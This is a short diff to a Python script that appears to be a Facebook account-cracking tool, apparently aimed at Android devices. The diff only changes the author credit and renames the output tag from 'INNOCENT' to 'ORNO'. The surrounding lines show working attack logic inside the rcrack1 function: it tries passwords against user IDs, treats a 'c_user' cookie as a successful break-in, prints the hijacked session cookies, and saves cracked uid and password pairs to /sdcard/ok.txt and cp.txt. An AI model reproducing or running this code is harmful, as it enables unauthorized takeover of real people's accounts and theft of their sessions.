@@ -1,4 +1,4 @@
-#Create By: ORNO ISLAM HIMU
+#Create By: ORNO ISLAM 
 #FaceBook: ORNO Islam
 #GitHub: https://github.com/ORNO-404-CYBER
 #---------------------------------------------------------------------------#
@@ -228,7 +228,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[INNOCENT-OK] {uid} | {ps}")
+                print(f"\033[38;5;46m[ORNO-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
                 open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -236,14 +236,14 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[INNOCENT-CP] {cid}|{ps}")
+                print(f"\x1b[38;5;196m[ORNO-CP] {cid}|{ps}")
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[INNOCENT] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[ORNO] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
